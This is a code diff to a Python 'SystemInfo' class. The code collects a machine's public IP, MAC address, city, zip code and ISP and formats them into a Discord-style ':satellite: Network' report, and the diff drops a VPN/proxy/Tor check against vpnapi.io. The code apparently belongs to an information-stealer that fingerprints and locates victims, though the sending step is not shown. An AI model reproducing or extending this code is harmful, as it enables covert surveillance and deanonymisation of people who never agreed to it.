@@ -132,31 +132,14 @@ class SystemInfo():
 
             return (data["country"], data["regionName"], data["city"], data["zip"], data["as"])
 
-        def proxy_check(ip: str) -> bool:
-            url = f"https://vpnapi.io/api/{ip}"
-            response = requests.get(url, headers={
-                                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
-            data = response.json()
-            security = data["security"]
-
-            [proxy, vpn, tor] = [security["proxy"],
-                                 security["vpn"], security["tor"]]
-
-            if proxy or vpn or tor:
-                return True
-
-            return False
-
         ip = requests.get("https://api.ipify.org").text
         mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
         country, region, city, zip_, as_ = geolocation(ip)
-        proxy = proxy_check(ip)
 
         return (
             ":satellite: Network",
-            # f"```IP: {ip}\nMAC: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}\nVPN/Proxy/Tor: {proxy}```",
-            "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}\nVPN/Proxy/Tor: {proxy}```".format(
-                ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_, proxy=proxy),
+            "```IP Address: {ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}```".format(
+                ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_),
             False
         )
 
